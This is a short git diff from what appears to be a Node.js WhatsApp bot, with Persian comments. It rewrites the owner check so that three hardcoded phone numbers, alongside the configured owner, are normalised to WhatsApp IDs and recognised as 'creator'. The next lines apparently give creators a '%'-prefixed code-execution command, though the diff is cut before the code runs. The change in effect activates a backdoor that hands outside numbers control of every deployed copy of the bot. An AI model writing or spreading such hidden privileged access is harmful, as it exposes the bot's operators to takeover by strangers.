@@ -201,10 +201,11 @@ const port = process.env.PORT || 9090;
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
   const udp = botNumber.split('@')[0];
-    const rayees = ('93744215959', '93730285765', '93782940033');
-    const ownerFilev2 = JSON.parse(fs.readFileSync('./lib/owner.json', 'utf-8'));  
-    let isCreator = [udp, rayees, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
-      .includes(mek.sender);
+  const rayees = ['93744215959', '93730285765', '93782940033'];  // اینجا یک آرایه قرار می‌دهیم
+  const ownerFilev2 = JSON.parse(fs.readFileSync('./lib/owner.json', 'utf-8'));  
+  let isCreator = [udp, ...rayees, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
+    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') // اطمینان حاصل کنید که شماره‌ها به فرمت صحیح تبدیل شده‌اند
+    .includes(mek.sender);  // بررسی اینکه آیا ارسال‌کننده مالک است یا نه
 
     if (isCreator && mek.text.startsWith('%')) {
 					let code = budy.slice(2);
